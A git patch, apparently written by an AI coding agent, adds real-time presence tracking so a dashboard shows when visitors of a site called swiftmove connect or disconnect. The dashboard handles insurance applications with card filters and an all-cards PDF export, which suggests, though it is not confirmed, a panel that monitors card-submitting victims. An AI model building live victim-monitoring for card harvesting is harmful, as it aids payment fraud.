@@ -1,0 +1,166 @@
+From 79e23c3a88095fa088205dc397a7acacbc57c4fa Mon Sep 17 00:00:00 2001
+From: Replit Agent <agent@replit.com>
+Date: Sat, 8 Aug 2026 02:02:23 +0000
+Subject: [PATCH] feat: add Realtime DB presence for instant Online/Offline
+ detection
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+- lib/firebase-services.ts: subscribeToPresence() listens to /presence RTDB path
+- app/page.tsx:
+  - subscribe to RTDB presence map (instant onDisconnect events)
+  - filteredApplications useMemo now overrides isOnline from RTDB presence
+  - periodic 30s tick forces re-evaluation even without Firestore updates
+  - fallback: lastActiveAt 30s window for legacy/non-RTDB visitors
+
+Data flow:
+  Visitor opens swiftmove → RTDB presence/docId = {online:true}
+  Visitor closes browser → onDisconnect fires → presence/docId = {online:false}
+  Dashboard RTDB listener fires → filteredApplications useMemo recomputes → UI shows ⚪
+---
+ app/page.tsx             | 60 +++++++++++++++++++++++++++++++++++++---
+ lib/firebase-services.ts | 24 ++++++++++++++++
+ 2 files changed, 80 insertions(+), 4 deletions(-)
+
+diff --git a/app/page.tsx b/app/page.tsx
+index 4cc61f2..c012721 100644
+--- a/app/page.tsx
++++ b/app/page.tsx
+@@ -5,6 +5,8 @@ import {
+   subscribeToApplications,
+   updateApplication,
+   deleteMultipleApplications,
++  subscribeToPresence,
++  type PresenceRecord,
+ } from "@/lib/firebase-services";
+ import { generateAllCardsPdf } from "@/lib/generate-pdf";
+ import type { InsuranceApplication } from "@/lib/firestore-types";
+@@ -136,6 +138,11 @@ export default function Dashboard() {
+   );
+   const selectedVisitorIdRef = useRef<string | null>(null);
+   const visitorOrderRef = useRef<string[]>([]);
++  // RTDB presence map: { [docId]: { online, lastSeen } }
++  const [rtdbPresence, setRtdbPresence] = useState<Record<string, PresenceRecord>>({});
++  const rtdbPresenceRef = useRef<Record<string, PresenceRecord>>({});
++  // Periodic tick so isOnline recalculates every 30s even without Firestore updates
++  const [tick, setTick] = useState(0);
+ 
+   // Play notification sound
+   const playNotificationSound = () => {
+@@ -143,6 +150,22 @@ export default function Dashboard() {
+     audio.play().catch((e) => console.log("Could not play sound:", e));
+   };
+ 
++  // Subscribe to Realtime DB presence (instant online/offline detection)
++  useEffect(() => {
++    const unsubscribePresence = subscribeToPresence((presence) => {
++      rtdbPresenceRef.current = presence;
++      setRtdbPresence(presence);
++    });
++
++    // Periodic tick every 30s to recalculate isOnline even when Firestore is quiet
++    const tickTimer = setInterval(() => setTick((t) => t + 1), 30_000);
++
++    return () => {
++      unsubscribePresence();
++      clearInterval(tickTimer);
++    };
++  }, []);
++
+   // Subscribe to Firebase
+   useEffect(() => {
+     const unsubscribe = subscribeToApplications((apps) => {
+@@ -157,8 +180,15 @@ export default function Dashboard() {
+       const thirtySecondsAgoTime = now.getTime() - 30 * 1000;
+ 
+       const appsWithOnlineStatus = validApps.map((app) => {
+-        const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
+-        const isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
++        // Prefer RTDB presence (updated by onDisconnect handler in visitor site)
++        // Fallback to lastActiveAt window calculation for legacy / non-RTDB visitors
++        let isOnline: boolean;
++        if (app.id && rtdbPresenceRef.current[app.id] !== undefined) {
++          isOnline = rtdbPresenceRef.current[app.id].online;
++        } else {
++          const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
++          isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
++        }
+ 
+         return { ...app, isOnline };
+       });
+@@ -279,7 +309,29 @@ export default function Dashboard() {
+ 
+   // Filter applications
+   const filteredApplications = useMemo(() => {
+-    let filtered = applications;
++    // Re-apply isOnline using latest RTDB presence + periodic tick.
++    // This makes the UI react instantly when a visitor disconnects (RTDB fires
++    // onDisconnect) without waiting for the next Firestore snapshot.
++    const now = new Date();
++    const thirtySecondsAgoTime = now.getTime() - 30 * 1000;
++
++    const appsWithLivePresence = applications.map((app) => {
++      let isOnline: boolean;
++      if (app.id && rtdbPresence[app.id] !== undefined) {
++        // RTDB presence is the most accurate source (updated via onDisconnect)
++        isOnline = rtdbPresence[app.id].online;
++      } else {
++        // Fallback: 30-second heartbeat window for visitors without RTDB data
++        const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
++        isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
++      }
++      return { ...app, isOnline };
++    });
++
++    // tick is intentionally listed in deps to force re-evaluation every 30s
++    void tick;
++
++    let filtered = appsWithLivePresence;
+ 
+     // Card filter
+     if (cardFilter === "hasCard") {
+@@ -318,7 +370,7 @@ export default function Dashboard() {
+     }
+ 
+     return filtered;
+-  }, [applications, cardFilter, searchQuery]);
++  }, [applications, cardFilter, searchQuery, rtdbPresence, tick]);
+ 
+   // Handle select all
+   const handleSelectAll = () => {
+diff --git a/lib/firebase-services.ts b/lib/firebase-services.ts
+index b4d3a21..d8d2e97 100644
+--- a/lib/firebase-services.ts
++++ b/lib/firebase-services.ts
+@@ -166,3 +166,27 @@ export const deleteMultipleApplications = async (ids: string[]) => {
+   const deletePromises = ids.map(id => deleteApplication(id))
+   await Promise.all(deletePromises)
+ }
++
++// ──────────────────────────────────────────────────────────────────────────────
++// Realtime Database presence listener
++// Listens to /presence/{visitorId} and returns the latest online/offline map.
++// Used by the dashboard to get instant disconnect detection on top of the
++// lastActiveAt-based 30-second window already in page.tsx.
++// ──────────────────────────────────────────────────────────────────────────────
++import { ref, onValue } from "firebase/database";
++import { database } from "./firebase";
++
++export interface PresenceRecord {
++  online: boolean;
++  lastSeen: number;
++}
++
++export const subscribeToPresence = (
++  callback: (presence: Record<string, PresenceRecord>) => void,
++): (() => void) => {
++  const presenceRef = ref(database, "presence");
++  const unsubscribe = onValue(presenceRef, (snap) => {
++    callback((snap.val() as Record<string, PresenceRecord>) ?? {});
++  });
++  return unsubscribe;
++};
+-- 
+2.50.1
+
